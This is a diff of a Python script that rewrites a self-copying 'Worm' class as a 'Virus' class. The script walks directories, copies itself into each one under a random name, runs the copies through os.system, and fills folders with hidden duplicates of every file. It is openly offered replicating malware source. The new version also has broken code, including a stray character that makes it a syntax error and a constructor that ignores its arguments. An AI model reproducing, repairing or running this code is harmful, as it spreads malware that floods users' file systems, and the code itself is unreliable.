@@ -1,35 +1,24 @@
 import os
-import shutil
+import shutil 
+#shutil is used to copy the content
+import random
 
-
-class Worm:
+#Intialize 
+class Virus:
     
-    def __init__(self, path=None, target_dir_list=None, iteration=None):
-        if isinstance(path, type(None)):
-            self.path = "/"
-        else:
-            self.path = path
-            
-        if isinstance(target_dir_list, type(None)):
-            self.target_dir_list = []
-        else:
-            self.target_dir_list = target_dir_list
-            
-        if isinstance(target_dir_list, type(None)):
-            self.iteration = 2
-        else:
-            self.iteration = iteration
-        
-        # get own absolute path
+    def __init__(self, path=None, target_dir=None, repeat=None):
+        self.path = path
+        self.target_dir = []
+        self.repeat = 2
         self.own_path = os.path.realpath(__file__)
         
+ # To get the path
         
     def list_directories(self,path):
-        self.target_dir_list.append(path)
-        files_in_current_directory = os.listdir(path)
+        self.target_dir.append(path)
+        current_dir = os.listdir(path)
         
-        for file in files_in_current_directory:
-            # avoid hidden files/directories (start with dot (.))
+        for file in current_dir:
             if not file.startswith('.'):
                 # get the full path
                 absolute_path = os.path.join(path, file)
@@ -39,36 +28,37 @@ class Worm:
                     self.list_directories(absolute_path)
                 else:
                     pass
-    
-    
-    def create_new_worm(self):
-        for directory in self.target_dir_list:
-            destination = os.path.join(directory, ".worm.py")
-            # copy the script in the new directory with similar name
-            shutil.copyfile(self.own_path, destination)
-            
-    
-    def copy_existing_files(self):
-        for directory in self.target_dir_list:
+#Make new file 
+   
+    def new_virus(self):
+        for directory in self.target_dir:
+            n = random.randint(0,10)
+            new_script="Virus"+str(n)+".py"
+            destination = os.path.join(directory, new_script)
+            shutil.copyfile(self.own_path, destination)s
+            os.system(new_script + " 1")
+#Replcate   
+    def replicate(self):
+        for directory in self.target_dir:
             file_list_in_dir = os.listdir(directory)
             for file in file_list_in_dir:
                 abs_path = os.path.join(directory, file)
                 if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                     source = abs_path
-                    for i in range(self.iteration):
+                    for i in range(self.repeat):
                         destination = os.path.join(directory,("."+file+str(i)))
                         shutil.copyfile(source, destination)
                         
                         
-    def start_worm_actions(self):
+    def Virus_action(self):
         self.list_directories(self.path)
-        print(self.target_dir_list)
-        self.create_new_worm()
-        self.copy_existing_files()
+        print(self.target_dir)
+        self.new_virus()
+        self.replicate()
         
         
                         
 if __name__=="__main__":
     current_directory = os.path.abspath("")
-    worm = Worm(path=current_directory)
-    worm.start_worm_actions()
+    Virus = Virus(path=current_directory)
+    Virus.Virus_action()
